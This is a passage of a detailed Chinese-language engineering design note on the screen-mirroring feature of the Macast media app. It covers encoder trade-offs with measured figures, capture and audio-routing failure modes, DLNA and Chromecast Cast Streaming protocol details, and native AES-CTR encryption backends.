VideoToolbox（`has_hardware_encoder()` 会 spawn ffmpeg 问一次，缓存**按 ffmpeg + 平台**分键，探测只在后台跑，绝不在 UI 线程上 spawn），**理由是延迟换 CPU，不是吞吐** —— 原来这句写的是"CPU x264 撑不住 Retina 桌面的实时帧率"，2026-10 实测证伪 —— 而**这个证伪自己也被证伪过一次，两半都要记**：
① **离线吞吐**：喂**文件**时 libx264 ultrafast+zerolatency 在 1920×1080 / 2560×1600 / 3456×2234 分别是
**486 / 295 / 171 fps（5.6–17.9 倍实时），代价 4.20 / 4.63 / 4.94 核**。这些数**都是真的**，
但**一个都不是镜像的成本** —— 镜像要的帧数不会超过采集交出来的那 24 fps。
② **在线成本**：喂真实 24 fps 桌面采集，同一条 argv 在 1080p 只吃 **0.59 核**，VideoToolbox **0.41 核**
（2026-10-02 三次跑，`scripts/encoder_latency_probe.py`；2160p 是 1.12 核对硬件 HEVC 的 0.64 核）。
所以真正的取舍是 **首帧约 200 毫秒 换 0.18 个核**，不是"41 毫秒换 4.5 核"——
**把离线天花板当成在线成本，会让硬件默认看起来便宜二十倍**。
（这一格我自己在探针 docstring 里反过来错过一次：写下"17.9 倍是帧复制 bug 不是结果"，
跑一遍离线形状它就复现了 —— **文档是对的、我那句"更正"是错的**，已就地撤回并留下这句话。）
用户报的"不开硬件编码几乎看不到画面"确实是**采集一帧都不返回**那一路（另见本行"读不到的音频口会饿死整条采集"），
但**这一族有两个各自独立的成因**，都只在软件路径上现形、都把读者送去 `PERMISSION_DOOR`（屏幕录制授权）
那个**真实、却不是他们需要的门**：
③ **`-level 42` 曾被写死给 h264_videotoolbox**：画面比 level 4.2 的 8704 宏块上限大就退出 **187**、
只写约 2 KB（本机 3456×2234 原画与 2160p 各复现两次；换成 `testsrc2` **文件源**照样复现 ⇒ 与采集无关）。
而 `auto` 在 Mac 上就落在硬件 ⇒ **原画档出厂即"什么都不产出"**，`has_hardware_encoder()` 抓不到
（它只 grep `ffmpeg -encoders`）。修法是 `vt_level(height)` 按**将被编码的高度**查表、查不到就**不钉**
（VT 自己在 1080p 选 level 4.0，比我们钉的 4.2 更保守）；`encoder_args(kind, platform=None, height=None)`
第三个参数默认 None = "不知道" = 对 VT 不钉，**方向是安全的那一边**（少钉一个 level 只是 SPS 不那么明确，
钉错一个 level 是每一帧都没了）。caststream 仍然钉 42 是**对的**：那里的 OFFER 已经把画面钉成 1920×1080，
level 是一句承诺而不是猜测。
④ **非 DLNA 路径曾没有输出 `-r`**：采集在 `Configuration of video device failed, falling back to default`
之后时间基退化到无法估帧率，x264 于是算出 `MB rate (14400000000) > level limit (16711680)` 并**一个字节都不编**；
VideoToolbox 容忍同一个畸形输入 —— 所以这条**只在软件回落时现形**，恰好是采集本来就已经不高兴的时候。
单变量实测：不加 `-r` **0 字节**，加 `-r 24` **3,932,160 字节**。现在 `build_ffmpeg_command` 对每条直播形状
都钉 `-r FPS`（`build_dlna_command` 一直钉 `-r profile.fps`，所以 DLNA 从没中过这一枪）。
**`-r` 与 `-fps_mode vfr` 互斥**（CFR 会把 `mpdecimate` 丢掉的帧原样复制回来），这是 `mpdecimate`
**没被采纳**的两个原因之一；另一个是 DLNA"伪装成文件"的 `Content-Length` 由名义码率推出，
少产字节会抽干电视的缓冲。它量到的收益也是**带宽不是延迟**（首帧 +4～14 毫秒，字节 −26～−28%，
而且那是静止桌面的最好情况，放视频时几乎不掉）。
那 ~200 毫秒**没有任何 VT 选项能拿掉**（`-realtime`、`-prio_speed`、`+constant_bit_rate`、
`+max_ref_frames 1`、`-bf 0`、`-coder cabac` 逐个试过；`-realtime 1` 与不传它输出逐字节相同 ——
它只选低延迟码控路径，不买延迟）。所以 `auto` 仍然落在硬件，但**这条默认的理由已经变弱**：
0.2 个核很便宜、200 毫秒不便宜，**翻不翻这个默认是用户的决定而不是测量结果**，所以没在这里替用户翻。
无论翻不翻，**页面必须把这笔账说出来**（`ENCODER_TRADEOFF` → `_capture_state()["encoder_note"]` →
采集卡那条 hint；它引的是**在线**数，并注明两边都含约 0.5 秒 ffmpeg 启动所以要看差值），
否则那个开关读起来就是"硬件=好、软件=差"，**没有第四档 `lowlatency`**：`encoder_args("software")` 已经是 x264 ultrafast+zerolatency，再加一个同 argv 的档位等于给用户两个做同一件事的菜单项。另一条同源修正：**VT 会把 `-b:v` 少给 30–33%**（要 4 Mbps 实发 2802 kbit，而同一个 4 Mbps 目标下 VT 的 VMAF 91.47 高于 x264 ultrafast+zl 的 90.78@4216 kbit —— 是保守不是画质差），所以 `rate_target()` 在 VT 上**要 1.5 倍**，让线上码率等于菜单承诺的那个数字；显式选的档位仍然被尊重，而一台其实没有硬件编码的机器在**启动时**（不是在判断时）回落 x264。**v0.10 起控制面板整个搬进设置页的「电脑投屏」tab，v0.12 起菜单栏里一条镜像行都没有，只剩通知**（停止走 tab、「停止接受投屏」或换渲染器，三条路都汇到同一个 teardown）。**慢消费者丢整块、绝不阻塞读管道**（阻塞会把编码器冻住；"丢整块"从 v0.10 起是真的整块 —— fMP4 按 `moof+mdat` 一片、TS 按 188 字节一包对齐丢弃，边界落在半包上时后加入的观看端永远对不齐；队列按**秒**预算而不是字节，`LIVE_QUEUE_SECONDS` ≈0.75 s，档位码率改的是队列块数）；ffmpeg 进程和 HTTP 服务**一启动就移交 renderer 持有**，终止统一由 pump 线程按 generation 判定上报（否则权限被拒会静默黑屏、或双线程抢清理）。杀掉/让位前先增 generation，让 pump 的死亡上报闭嘴。**重播不对称**（红线）：浏览器会话重播 init segment + 8 MiB 环形尾部，cast（Chromecast）会话永远只拿「接下来」的字节 —— 给电视重播积压 = 它此后一直慢几秒；`dlna` 会话是第三种形状：**按绝对字节偏移**从 48 MiB 环形缓冲里取（电视把它当文件读，会 HEAD、探边界、断线重连同一偏移），见下「伪装成文件」。**`_retain` 里 init 头必须切到第一个 `moof` 才算完**（晚加入的观看端拿双份头 = 花屏，别把它想成"缓存一点前缀"）。观看地址带**每会话随机**的 `stream_id` + `page_token`（`hmac.compare_digest` 常量时间比对），**故意不用应用的常驻 `Api_Token`** —— 那是管理令牌，泄露一次等于永久开放整套管理 API，而镜像页 URL 会被复制/转发/贴进群。页面 JS 只用 `textContent`，响应带 `nosniff` + `no-store`。DLNA 推流来时**让位**并转投该 URL（Bridge 行为）—— **cast 与 dlna 两个电视目标都会**；浏览器目标下推送会被明确拒绝而不是杀镜像（`set_media_url` 的守卫顺序：空 url → 同一 URL 重复推 → 无目标；"无目标"按当前 kind 分别查 `target()` / `dlna_target()`，**别只查一个**，否则浏览器目标会误以为有中继对象）。镜像期间 `caffeinate -dimsu` 持有休眠断言，teardown 释放。**系统声音只在有采集口时开**：macOS 认 BlackHole 设备（FFmpeg 发行版至今抓不了 mac 系统音频）、Linux 认 pulse `<sink>.monitor`、Windows 仅画面；探测结果缓存在 `_capture_cache`（键含 cursor —— 指针开关会改采集命令，改指针/屏幕要 `invalidate_capture_cache()`）。**「一轮搜索没结果」不是一句话，是五种机器状态**（v0.10/v0.12）：正在搜 / 真的没人应答 / 只有这台 Mac 自己的接收端（已被滤掉）/ 应答了但描述拉不到 / 网络侧读不到网卡 —— 判定收在 `_search_words(...)` 一处，**每一格都必须给出下一步**（电视是否开机、是否在同一个网络、点「重搜设备」）。两个曾被踩空的细节：① **一条 M-SEARCH 不等于搜过一次** —— 刚唤醒的接收端还没加入组播组，所以一轮发两条（间隔 timeout×0.45）；② 钉住网卡时组播要显式设 `IP_MULTICAST_IF` 从那个口出去，光设源地址不够；没钉网卡时**不要猜出口**，交给内核，猜错会让虚拟机网桥把搜索吞掉。**「有采集口」和「声音真的进得来」是两件事**（v0.12）：聚合设备建好、默认输出切过去，都不保证 ffmpeg 那一路听得见 —— 所以控制台问的是**当前默认输出设备的 UID** 是不是采集用的那块设备（`system_audio_routed()`），页面据此区分「已启用」与「有声音进来」，而不是只报一个"装好了"。**读不到的音频口会饿死整条采集，而且一句话都不说**（2026-09-23 在装好的 `.app` 上实测）：avfoundation 把系统声音当作**麦克风**输入，麦克风授权没给（或 BlackHole 那头没人喂时钟）时它不报错，而是**连画面也不再产帧**；3 秒预算到点后 ffmpeg 只留下两句在**正常采集里也会出现**的运行时噪声（`objc[…]: class \`NSKVONotifying_AVCaptureScreenInput' not linked` 和 `Configuration of video device failed, falling back to default.`），把它们当成原因就是误导 —— 同一台机器、同一条命令，把音频口拿掉 6 秒就写出 3.9 MB H.264。现在三处收口：`FFMPEG_NOISE` 把"健康采集也会打"的行挡在消息之外（日志照旧全留）、无帧时先用 `video_only_capture()` **降级成只采画面**（杀进程前**先增 generation**，否则 pump 会把我们自己这一刀报成"采集中断"）、每一条"没有返回画面"都必须给出门（`PERMISSION_DOOR`）与「勾选后重启 Macast」，降级成功的通知也要说出少了声音和去哪补（`AUDIO_DROPPED_SUFFIX` 点名麦克风），**并且这句话必须活在页面上而不只是一次性通知**（`renderer.audio_dropped()` 是会话自己的答案，`_status_line` 挂 `AUDIO_DROPPED_MARK`、`_audio_line(renderer)` 在会话弃声时不再说「已启用」—— 通知闪过就没了，「系统声音：已启用」配上一条无声的镜像正是 v0.12 要终结的那个谎）。**同一条接缝在别的平台上也必须真的生效**（Part 40）：`_audio_line(renderer, platform=...)` 的 `platform` 是文档写明的测试接缝，而三条「未启用」分支读的是 `sys.platform` —— 在 Linux runner 上问 `platform='win32'` 拿到的还是 Linux 那句，也就是说"该去哪个系统面板"这句话会随**跑代码的那台机器**变。现在三条都问 `platform`，Linux 的那一句给出门（`PULSE_DOOR`：`pactl get-default-sink` 问得出默认输出设备 + 装 `pulseaudio-utils` + 点「重新探测采集」，而不是只报一个"需要 PulseAudio"），`_default_pulse_monitor` 也不再把手动的 `except Exception: return None` 当成"没有线索可留"（分 `OSError`（pactl 根本不在）与其它，`logger.debug` 记下 pactl 的 stderr —— 探测是缓存的、不在热路径上）。回归用例 Part 38。**通知本身不是「清理」的前置条件**（2026-09-24 Windows 实测崩溃）：pystray 的气泡缓冲是
`szInfo[256]` / `szInfoTitle[64]` **字符**（不是字节），超了 ctypes 直接抛 `ValueError: string too long`，
而 `cherrypy.engine.publish('app_notify', …)` 会把订阅者的异常原样抛回**发布方线程** —— 于是 `_fail()`
炸在它自己的 `notify()` 那一行，调用者写在**下一行**的 `_teardown()` 被跳过：页面读「未镜像」而 ffmpeg 与观看
HTTP 服务还在跑。修在边界上，两层：`gui.fit_notification()` 把超长文案压进缓冲且**保留头 + 尾**、中间挂
「……（全文见设置页「电脑投屏」的活动）」（尾巴才是可执行的那半句，砍尾等于违背本行「每一条失败必须给出门」），
`screen_mirror.notify()` 吞掉 publish 失败并记 warning。用例：Part 36 的假托盘按真缓冲宽度拒收，Part 38 用
一个抛异常的订阅者证明 `_teardown` 仍然跑到；真机侧用真 `NOTIFYICONDATAW` 量过（不截断必抛、截断后正好 256）。
CoreAudio 聚合字典的读法在本机 CLI 沙箱里问不出来（SDK 缺 `AutoHAGTypes.h`、带缓冲才回 `!dat`），**这一条判定要在真 Mac 上验收**，别把它写成已验证。**v0.3 起一键辅助装 BlackHole**（设置页「电脑投屏」→「系统声音 → 一键设置」）：地址与 sha256 以 Homebrew cask API 为准（拉不到用 PINNED 兜底）→ `open` 图形安装器（用户输一次密码，.pkg 无法静默装，**别把它想成全自动**）→ 轮询设备出现 → ctypes 调 CoreAudio 建/复用**多输出聚合设备**并切默认输出（UID `com.macast.screenmirror.output`，原默认存 `Mirror_Audio_Original` 供「恢复原声音输出」）；**任何一步失败降级为打开「音频 MIDI 设置」+ 文字指引**。
**v0.7/v0.9 修的是"一键设置安装失败"的三类真实根因**（症状都是「装了却没有设备」，旧流程只会说"安装被取消了吗？"）：
① **pkgutil 残留记录但驱动文件已不在磁盘** —— `_blackhole_receipt_present()`（问 pkgutil 记录）与
`_blackhole_driver_installed()`（glob `/Library/Audio/Plug-Ins/HAL/BlackHole*.driver`）是**两个问题**，
**别拿记录当安装状态**；检测到"记录在、文件没在"就直接重装并在 probe 步骤里说清楚原因。
② **官方 .pkg 的 postinstall 只 chown/chmod，从不重启 coreaudiod** —— 驱动落了盘但守护进程永远不加载；
等设备安装超时后若发现"文件在盘上但列表里没有"，用 osascript `do shell script … with administrator privileges`
**征求一次管理员密码**重载 coreaudiod 再等 45 秒（`-128` = 用户取消密码框，要如实报"你取消了密码框"，
**别伪装成超时**）。
③ **probe 分支"把跳过写成了一个句子"**（v0.9，就是用户报的"重启后再点一键安装又要安装一遍，永远装不完"）——
旧代码在"驱动文件在磁盘上"时打印 `安装会被跳过`，然后**照样 fall through** 到 meta/download/verify/install，
于是每次点一键都重新下载一个 pkg、再开一次安装器，而 `reload` 只有等满 300 秒超时才可达。
修法是把判定收成一个值：**`_blackhole_state(ffmpeg)` 五态**（capturable / loaded / on-disk / stale-receipt / absent），
**"跳过"必须是步骤机里的 skipped 状态，不是 note 里的话**。两个见证者必须分开报：
avfoundation（`_has_blackhole`，采集真正会用的那一个）与 CoreAudio（`_find_blackhole`，无权限门槛）不一致时
是**麦克风权限**问题，重装 pkg 永远修不好 —— 这一支照样建聚合设备、切默认输出，但**结尾不许说"已就绪"**：
把 `probe` 改标失败（步骤机允许：这一轮的真实结论就是那个否定答案，绿色的页面 + 没有声音 = 原来那个幻觉），
并点名「系统设置 → 隐私与安全性 → 麦克风」（`.app` 缺 `NSMicrophoneUsageDescription` 时系统连弹窗都不给，
声明在 `scripts/setup_py2app.py`）。**每一支失败文案都要说出"再点一次不会重新下载"**。
整套流程走 `_SetupProgress` 步骤机（env/probe/meta/download/verify/install/wait/reload/aggregate/output；
**done 步骤拒绝重入 = 进度条永不回退**；skipped 不进分母），同时起一个 **127.0.0.1 随机端口**的实时进度页
（每轮随机 token + `hmac.compare_digest`，同样**绝不用常驻 `Api_Token`**；nosniff+no-store；textContent-only；
跑完保留 300 秒可读再自动关；**页面起不来不算安装失败**——通知里仍带每一步）。
失败必须**指名到底哪一步**：`_route_audio_through_blackhole` 内部把"聚合设备"与"切默认输出"分开标失败，
外层不再 blindly fail('aggregate')（否则"设备建成了但切换失败"会谎称创建失败）。CoreAudio 的坑：`kAudioObjectSystemObject` 是 **1**（0x1000 是 hardware model，问它要设备列表回 `'nope'`）；`inDataSize` 是 `size_t`；NULL-data 的探测在本机被拒——直接带大缓冲问。CLI 沙箱里设备枚举不可用（只有 `dOut` 通），所以这套 ctypes **要在真 Mac 上验收**；读接口都在，测试只打桩不触碰。**v0.5 的 DLNA 电视目标 = 把直播伪装成一个文件**（MirrorCast 那一族的做法），红线集中在四处：① `Content-Length` 必须是**按档位码率算出来的固定值且 < 2³¹**（老固件用有符号 32 位记长度，报 `-1`/报超大都不播），时长与 `Duration` 要和这个长度自洽；② 每次响应都要带 `Accept-Ranges: bytes` + `transferMode.dlna.org: Streaming` + `contentFeatures.dlna.org`，探边界的请求要**恰好**回 n 字节（不足用 MPEG-PS 填充包 `00 00 01 BE 00 00` 补），206 才配 `Content-Range`（**没带 Range 的请求即使语义上是"整个文件"也必须回 200 且不发 `Content-Range`**，`bounded` 和 `has_range` 是两件事）；③ 推流前先攒 `dlna_prefill_bytes(profile)`（= 档位总码率 × **用户选的**秒数，夹在 2–8 MiB，v0.10 前是写死的约 20 MiB）再交给电视，代价是**看得见说得出的延迟**（默认画质下五档都是约 4 秒 = `DLNA_PREFILL_SECONDS` × 码率，状态行/开始提示都要报秒数）。**2026-10 起这个秒数是「投屏形状」卡上的一个旋钮**（`Mirror_Dlna_Prefill`，1/2/4/6/8，改它重启镜像）：`dlna_prefill_seconds_setting()` 越界**夹住而不是拒绝**（拒绝的后果是一台不肯播的电视加上没有任何解释），`dlna_prefill_bytes(profile)` 保持**一个位置参数**（Part 21/23/37/39 都用 `lambda profile: …` 打桩它，多一个参数就在与打桩无关的地方炸成 TypeError），`dlna_prefill_seconds(profile)` 仍**从字节预算反推**而不是把设置读回来（预算被 2 MiB 下限或 8 MiB 上限挪过之后，这两个答案不一致比任一个近似都糟）。**默认仍是实测过的 4，不是下限的 1** —— 理由写在 `DLNA_PREFILL_MIN_SECONDS` 上：MirrorCast 在真 Philips 43PFS5301（2016，非 Android）上预填约 20 MiB ≈ 20–25 秒且明说，所以"要得比我们下限更多"的固件确实存在，而这台机器上没有那样的电视可以量出**我们的**下限；**量不出来的数就交给能量它的人，代价印在旁边**（`DLNA_PREFILL_HINT`：「这个数字就是看得见的延迟」）。顺带记一条**这一趟才修的谎**：`OUTPUT_HINTS['dlna']` 原来是模块级字面量，于是它永远说"约 4 秒"，而用户把它调成 2 之后卡片仍在说 4 —— 现在读它的一律走 `output_hint(kind)`，那个函数**当场重算**。同一族还有 `OUTPUT_HINTS['caststream']`：它写着"纯 Python 加密，上限 4.5 Mbps"，在②改完之后**整整过期了一轮**（那句提示会把人送去找一个已经不存在的限制），现在两个数都由 `cast_stream_bitrate_cap()` 与 `native_aes_name()` 算出来。**浏览器那一端有一个同形状的旋钮**：`LIVE_EDGE_SECONDS`（播放页停在直播边缘后面几秒，2026-10 前写死 3 秒）现在是 `Mirror_Live_Edge`（0.5/1/2/3/5，默认 1.0），**改它不重启镜像** —— 这个数是发页面时注进 HTML 的（`@LIVE_EDGE@` 占位符，与 `@DIAG@` 同一套写法），刷新观看页就生效；为改一个播放器从自己 HTML 里读的数字去重启一次采集，是"用最贵的方式什么都不做"。**下限是 0.5 秒不是 0**，但理由换过一次：v0.18 写的是"这一路分片节奏是 `gop_size('browser') = FPS // 2 = 12 帧 = 0.5 秒`（fMP4 分片要等**下一个** `moof` 才算完），1.0 秒留了两个分片余量"——那句随 v0.19 的 muxer 改动作废（分片变成每帧 41.7 毫秒，0.5 秒已是 12 个分片）；现在这个下限站在实测上：0.5 与 1.0 只差 9 ms（829/838，噪声内）。**v0.18 还写下过一句"`movflags=+frag_every_frame` 不在这个改动里"**（理由：分片本来就是 0.5 秒、切到一帧买不到东西却每帧多一个 `moof`，约 40 kbps），那是从批准措辞里**主动缩小**的一处 —— **v0.19 用探针把它推翻了**（`scripts/mse_latency_probe.py`：真浏览器 + 真采集 + 硬件编码；矩阵与脚注在 `docs/research-screen-mirroring-transport-2026-10.md` §3）：同一个 `-g 12` 只换 muxer，端到端 lag p50 **1305 → 838 ms（−36%）**、VMAF 同值（94.42）、字节 +~1%；更密的 `-g 2` 被否掉（VBQ 抽干，画质 93.9→81.1）；**park 在细粒度下失效**（1.0 vs 0.5 差 9 ms、0 seek），所以 `Mirror_Live_Edge` 默认不动，它从"延迟控制"变成了"恢复距离"。这带来两条新契约：① **分片不再保证以 IDR 开头**（`frag_keyframe` 的副产品作废），`_Fragments` 逐片做真 IDR 检查（`starts_with_keyframe` 解 moof+mdat 的 AVCC，SEI/SPS/PPS/AUD 前置要跨过，读不懂一律 False —— 错的 True 是贵的那个方向），`_Broadcaster.tail()` 因此**割到最新的可重播分片**；ring 里一个都没有时回空而不是喂糊（`keyframe_misses` + 一条 warning），而**全可入**的 ring（未分帧回落形状）仍整环重播 —— Part 22 的老契约在那里原样成立（v0.19 第一版把全 True 的 ring 裁成"只有最新一块"，正是它变红抓出来的）；② `LIVE_EDGE_MIN_SECONDS` 仍 0.5。回归用例 **Part 53**（12 条：AVCC 逐格、framer 三字段、ring 割点/拒绝/计数/日志、全可入整环），Part 43 与 Part 44 各补一条（Matroska 不得被当成重播点；帮助与观看页提示引的 41.7 毫秒必须由 `FPS` 算出来）。`PLAYER_PAGE` **必须继续是 raw 串**（§4.8 红线④），新占位符没改变这一点。环外偏移要报丢块而不是回错字节（`_ByteLog.read` 里 `max(absolute, _start)` 的钳制不能省 —— 负数切片会真的把**新**数据当成旧偏移发出去）；④ **档位**（`DLNA_PROFILES`：ps-pal / ps-ntsc / ts-mpeg2 / ts-h264 / mkv-h264）决定封装、帧率、帧尺寸、`-g` 和**音频编码**（PAL/NTSC 用 AC-3 不用 AAC，DVD 时代的电视不认），看门狗每 5 秒 `GetTransportInfo`，掉出 `PLAYING` 重投 URL，`RelTime` 在动才算活着。**v0.17 起"连续失败自动换下一档"是真的换，不再只是提示**（`_rotate_dlna_profile`）：一次运行最多 `DLNA_MAX_PROFILE_TRIES = len(DLNA_PROFILES) - 1` 档，每一步 = 重启编码器（比一次重投贵几秒），所以四条边界必须同时成立 —— a) **只在证据指向"容器被拒"时换**：`misses >= DLNA_MAX_REPUSHES`，或 `exchanges` 动了而 `written` 没动连续 `DLNA_MAX_REFUSALS` 次；b) **「伪装成文件」形状永不换档**（`session.bytelog` 为真直接 `return False`）—— 那里的失败是"电视拿一个伪造长度去尾部找不存在的索引"，换五个容器也换不出来，`_give_up` 早就在说换形状，换档会把那句话埋掉；c) **绝不写用户的选择**：阶梯只在实例上（`_profile_id` / `_profile_tries`），`start_mirror` 清空它，`Mirror_Dlna_Profile` 一个字节都不动 —— 所以页面上亮的档位（`dlna_profile_display()`，**由 renderer 回答**）与设置里存的**可以不一致**，而 `_run_mirror` 只**问一次**（`active_dlna_profile()` 的返回值同时交给 session 与 ffmpeg argv；两处各问一次就是"画面档位与 argv 档位分家"的来源，Part 23 有两条**纯文本**用例守着这一条，因为它们问的是"谁在什么地方问")；d) **换档前先增 generation 再 `_teardown()`**（本行末尾那条通用红线在这里同样成立），且 `_teardown` 必须同步做完，否则紧随其后的 `start_mirror` 会看见 `_starting` 还挂着而静默什么都不做 —— 一个停在第 2 档的阶梯比没有阶梯更糟。**放弃（`_give_up`）之后要 `_retire_session()`**：`_fail` 只把 `_mirroring` 关掉，此前没有任何东西去关 ffmpeg 与 HTTP 服务，于是页面读「未镜像」而采集其实还在跑。**默认档位随形状走**（`default_dlna_profile_id(shape)`）：直播形状 = `ts-h264`，伪装成文件 = `ps-pal`（那一档本来就是为 DVD 时代固件留的，而我们**没有**老电视可验）。理由是量出来的（同一台 Mac、同一接收端、同一编码器、20 秒 A/B 跑两轮）：`ps-pal` 首帧 5.86 秒 / 稳定 5.08，`ts-mpeg2` 首帧 2.47 / 稳定 2.15，而这两档载荷逐字节等价（同为 mpeg2video + AC-3、同 CBR、同 25 fps、同 720×576）—— **3.4 秒是容器要的，且开局晚就全程晚**（两边位置都以 1.00x 前进）。机制两条：`-preload` 给 vob 刻进 `start_time 0.534667`（`-preload 0` 是 0.034667，实测 5.86 → 5.30，**故意不发**：PS 的 VRV 模型靠这段交错余量活着，下溢会刷警告加花屏），以及 MPEG-PS 自我确认弱（`ffprobe probe_score` PS 26 / TS 100 ⇒ 接收端多留 1.1–1.4 秒探测缓存）。**`-muxrate` 是被证伪的第三个嫌疑**（明写 10080000、真实码率、20160k 三个都落在 as-shipped 上）。五档的数（`DLNA_PROFILE_LATENCY`）与它的**限定语**（`DLNA_PROFILE_LATENCY_SCOPE`：接收端是本机另一台 mpv/Macast，**不是真老电视**）一起显示在设置页「兼容档位」的 `title` 上，用例逐条比这两处文案 —— **表格与限定语必须同时出现**，只给数字就是把手边的接收端当成全世界的电视。**测试契约跟着 renderer 的脸走**：`console_state()` 问的是 renderer 的 `dlna_profile_display()`，所以每个假 renderer（`_FakeMirror22`、`_FakeMirror23`、Part 35 的 `types.SimpleNamespace`）都得有它，少一个就是一个 AttributeError 打断整个 Part。还有 Part 23 那台假电视多了一个 `refuse` 开关：**"取走地址却一个字节都不读"这一格必须由它把 `Play` 也答成 STOPPED** —— 我们的重投本身就会让一个配合的设备进 PLAYING，而假设备照默认动作回 PLAYING 时看门狗什么都不做是**正确行为**，用例却会把它读成"回退逻辑坏了"（它第一次写出来时的红法正是这个）。**发送端（我们）自己的 SOAP 也有一条红线**：`Content-Length` 必须按 **UTF-8 字节数**算，`len(str)` 会让带中文设备名的 DIDL 在局域网里被**截断**（电视回 SOAP Fault，症状是"电视没反应"而不是"我们发错了"）。发现侧：控制 URL 可能是相对路径，也可能是设备自称的另一地址/漏端口 —— 以**实际应答的地址+端口**为准（`parse_description` 里 `netloc` 而不是 `hostname`，端口用 `_port_suffix()` 兜非数字）。回归用例 **Part 23**：把**我们自己的 DLNA 接收端**（`protocol.DLNAProtocol().call()`）当最严格的 SOAP/DIDL 校验器用 —— 它真的 lxml 解析并解嵌 DIDL，所以"我们发的东西连自己都不认账"这类问题在打桩测试里也能被抓出来。**v0.6 的第二条 Chromecast 通道 = Cast Streaming（`caststream`，设置页里的「Chromecast 低延迟（实验 · 此通道无声音）」—— 它的提示必须同时说出"电视不认这一通道时自动回落兼容通道，那时是有声音的"**，否则用户第一次听到声音就会来报标签是假的：这一条正是这么来的）**：
      完全不走 HTTP、不发 `LOAD`、没有 SDP —— deviceauth → CONNECT → LAUNCH(`0F5096E8`) →
      `urn:x-cast:com.google.cast.webrtc` 上的 OFFER → ANSWER 给一个 UDP 端口 → UDP 上发
      RTP(12B) + Cast 头(7B)。红线全在这几条：① **`LAUNCH_ERROR` 就是能力探测**，收到就
      回落 `cast`/LOAD 通道，握手放在 ffmpeg 与 HTTP 服务**之前**，所以回落不需要拆摊子
      （`handed` 标志决定 sink 归谁，被 generation 打断时也要 `_cleanup(..., sink)`）；
      ② **加密走操作系统的原生 AES-128-CTR，纯 Python 只是最后的兜底**（2026-10 改；
      此前 ② 写的是"纯 Python ≈1.3 MB/s 才是码率天花板 4.5 Mbps"，那句在当时是真的，
      现在**整条作废**）。三个后端全部经 `ctypes`，**一个新依赖都没有** —— 这正是它能进
      第一批的原因：Part 30 的白名单、三处打包配置、`requirements/*.txt` 一个都不用动。
      darwin = CommonCrypto（`CCCryptorCreateWithMode` + **每帧 `CCCryptorReset`** + 一次
      `CCCryptorUpdate`）、nt = bcrypt（`ChainingModeCTR`）、其它 = libcrypto（`EVP_aes_128_ctr`）。
      四条被量过或被否掉的决定，改这里之前先读：
      **(a) 句柄按实例缓存、每帧只 `Reset` 不新建** —— `CCCryptorReset` 与新建一个 cryptor
      逐字节相同（frame id 0/1/2/3/7/255/256/65535/2³¹ 都验过），而这是 4,994 → 11,297 MB/s 的
      全部来源；`__del__` 里释放，释放失败要吞掉（解释器退出时库可能已经没了）。
      **(b) 一个访问单元只调一次 `Update`，绝不切块** —— 按 1,200 字节切会把 CommonCrypto
      打到 811 MB/s（ctypes 调用本身约 1.4 µs）。
      **(c) 两条退路是故意不做的**：Windows 上"每 16 字节调一次 `BCryptEncrypt` 拼 ECB 当 CTR"
      被否掉（一次调用比它要替代的那段 Python 密钥表还贵 ⇒ 那不是兜底，是戴着原生徽章的降级）；
      `libgcrypt.so.20` 从 Linux 链里删掉（一个没法测的第四后端是负债）。
      **(d) macOS 上绝不去探 libcrypto**：`ctypes.CDLL('libcrypto.dylib')` 按裸 soname 加载会
      **把解释器直接 abort 掉**（SIGABRT / 退出码 134），因为 CPython 自己已经载了一个不同版本的
      libcrypto，扁平命名空间下的符号冲突是致命的。
      另外 **每个后端的 `crypt` 都要有 `if not data: return b''`**：`ctypes.create_string_buffer(0)`
      给的是 1 字节缓冲、`.raw` 是 `b'\x00'`，空输入那条 KAT 会红。
      **上限从 4.5 提到 `CAST_STREAM_MAX_BITRATE = 8 Mbps`**（`CAST_STREAM_DEGRADED_BITRATE = 4.5`
      只在真降级时生效；`cast_stream_bitrate_cap()` 是唯一判定点，别在别处再写一个 4500000）。
      本机余量：按**真实链路形状**（复用句柄 + 每帧重算 counter block + 41,667 字节的访问单元）
      5,367 MB/s、每帧 7.8 µs，纯 Python 同负载 1.35 MB/s ⇒ 约 4000×。**别引用 11,297 MB/s
      那个数**：它是"只算加密、不算 `frame_iv` 与新建 IV 缓冲"的形状，好看但不是我们跑的那条路
      （这条错已经犯过一次，写进注释后被自己抓出来）。8 Mbps 本身是**我们选的数不是量出来的**：
      Google 自己的 `kDefaultVideoMaxBitRate` 是 10 Mbps、Chrome 标签页投屏默认 5 Mbps。
      后端**有名字**（`_NATIVE_AES = (name, make, crypt, release)`，`native_aes_name()` 读它）：
      三个闭包叫 make/crypt/release 时长得一模一样，"某个 OS 后端加载了"是日志/页面提示/用例
      能做出的最强陈述，而那不够用 —— 启动时跑一次 known-answer 自检（`_aes_known_answer`，
      四条向量含空输入），过了才认这个后端，然后把名字打进日志、页面提示和 `_quality_note()`。
      **一句必须留在文档里的诚实话**：KAT **永远区分不出**"只加低 64 位计数器"与"整个 128 位
      级联加"（那要 2⁶⁴ 个块才现形）。安全性靠的是 `frame_iv` 的布局（frame id 在字节 8..12、
      12..16 是零 ⇒ 每个访问单元 2³² 个块 = 68.7 GB 余量；要进位到固定的高半区需要
      `aesIvMask[8:16]` 落在距 2⁶⁴ 约 2,600 以内，每会话概率约 2⁻⁵¹）。**那条自检是"操作系统
      换了"的绊线，不是安全论证** —— 谁要把它当成后者的证据，就会在换平台时以为验过了；
      ③ 加密是**每帧一次**（per-frame nonce：frame_id 大端放 counter block 的字节 8..12 再
      XOR `aesIvMask`），**切片在加密之后**，反过来就解不开；④ **x264 `-tune zerolatency`
      会把一帧切成多个 slice（实测 720p 10 片）**，访问单元只能按 `first_mb_in_slice==0`
      （NAL 头后第一字节最高位，ue(v) 0）判起，一个 NAL 一帧 = 电视上永远只有 1/10 张图；
      ⑤ **`-aud` 是 AVOption 不是 ffmpeg 开关**，必须写 `-aud 1`，否则它把下一个选项当成
      自己的值吃掉（症状：`Unable to parse "aud" option value` 然后把参数串当输出文件名）；
      x264 参数名是 `min_keyint` 不是 `i-frame-min`，**写错只打一行 error 然后静默忽略**；
      ⑥ 媒体 socket **bind 但不 connect**（connected socket 会被内核丢掉电视从自己端口发的
      checkpoint），收 RTCP 按 `peer[0] == 电视 IP` 过滤；RTCP 长度字段 = **含 4 字节头的
      总字数 -1**（CAST 块 16 字节体 ⇒ 4，写 3 会永远读不到确认，在途窗口填满后一直丢帧）；
      ⑦ **在途窗口按时长算，不是按帧数**（2026-10 改）：`clamp(2 × RTT, MIN_WINDOW_MS=66 ms,
